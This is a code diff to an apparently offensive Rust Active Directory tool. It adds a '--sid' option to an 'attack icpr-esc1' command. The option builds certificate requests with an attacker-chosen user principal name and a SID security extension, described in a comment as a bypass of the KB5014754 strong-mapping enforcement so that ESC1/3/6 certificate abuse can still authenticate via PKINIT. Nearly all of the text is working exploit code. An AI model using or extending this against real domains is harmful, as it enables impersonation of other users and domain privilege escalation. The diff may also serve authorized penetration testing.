@@ -109,6 +109,13 @@ pub(crate) struct IcprEsc1Args {
     /// Only used when `--esc esc15`.
     #[arg(long, default_value = "1.3.6.1.5.5.7.3.2")]
     pub esc15_eku: String,
+    /// **1.5.2 KB5014754 bypass.** Target user's objectSid — when set, the CSR is built by
+    /// adhammer's own DER encoder (with the `szOID_NTDS_CA_SECURITY_EXT` strong-mapping
+    /// extension) rather than by `ms-icpr::build_csr_with_upn_san`. Required for PKINIT to
+    /// succeed against Full-Enforcement KDCs (Server 2019+/KB5014754, mandatory since Feb 2025).
+    /// See `attack esc1 --help` for the same flag semantics.
+    #[arg(long, value_name = "SID")]
+    pub sid: Option<String>,
 }
 
 /// `attack icpr-esc1` — build an ESC1/3/6/15 CSR via `ms-icpr` with an attacker-supplied
@@ -205,9 +212,18 @@ async fn icpr_esc1_impl(a: IcprEsc1Args, checklist: &mut crate::ui::StageCheckli
     // Build the CSR according to the ESC variant. ESC1/ESC6 use the plain
     // UPN-SAN CSR; ESC15 injects an EKU via Microsoft Application Policies
     // (EKUwu shape); ESC3 builds the plain CSR, and the CMS EOBO wrapping
-    // happens later in the dispatch section below.
-    let csr = match a.esc {
-        EscVariant::Esc15 => ms_icpr::build_csr_with_upn_san_and_ekus(
+    // happens later in the dispatch section below. When `--sid` is set (1.5.2
+    // KB5014754 bypass), route the ESC1/3/6 paths through adhammer's own CSR
+    // builder so the szOID_NTDS_CA_SECURITY_EXT extension is emitted; ESC15's
+    // Application-Policies encoding lives in ms-icpr, so `--sid` + ESC15
+    // bails with a pointer to the follow-up ms-icpr release.
+    let csr = match (&a.esc, a.sid.as_deref()) {
+        (EscVariant::Esc15, Some(_)) => anyhow::bail!(
+            "--sid on --esc esc15 is not yet supported — ESC15's Application-Policies encoding \
+             lives in the ms-icpr sibling crate. Land ESC15+SID in the next ms-icpr release; for \
+             now use `attack esc1 --sid` on an ENROLLEE_SUPPLIES_SUBJECT template instead."
+        ),
+        (EscVariant::Esc15, None) => ms_icpr::build_csr_with_upn_san_and_ekus(
             &a.subject,
             &a.target_upn,
             &[a.esc15_eku.as_str()],
@@ -215,7 +231,24 @@ async fn icpr_esc1_impl(a: IcprEsc1Args, checklist: &mut crate::ui::StageCheckli
             ms_icpr::EkuCarrier::ApplicationPolicies,
         )
         .context("build_csr_with_upn_san_and_ekus (esc15)")?,
-        _ => ms_icpr::build_csr_with_upn_san(&a.subject, &a.target_upn, &key_pem)
+        (_, Some(sid)) => {
+            // Parse the PEM key that was either read from disk (--key) or generated above,
+            // then re-encode via adhammer's DER builder with UPN SAN + SID-mapping extension.
+            use rsa::pkcs8::DecodePrivateKey;
+            use rsa::RsaPrivateKey;
+            let key_pem_str = std::str::from_utf8(&key_pem).context("key pem is not utf-8")?;
+            let key = RsaPrivateKey::from_pkcs8_pem(key_pem_str)
+                .context("parse key PEM for SID-ext CSR")?;
+            adhammer_kerberos::csr::build_csr_from_key(
+                &key,
+                &a.subject,
+                Some(&a.target_upn),
+                Some(sid),
+            )
+            .context("build CSR with SID-ext")?
+            .der
+        }
+        (_, None) => ms_icpr::build_csr_with_upn_san(&a.subject, &a.target_upn, &key_pem)
             .context("build_csr_with_upn_san")?,
     };
     let csr_stage_label = match a.esc {
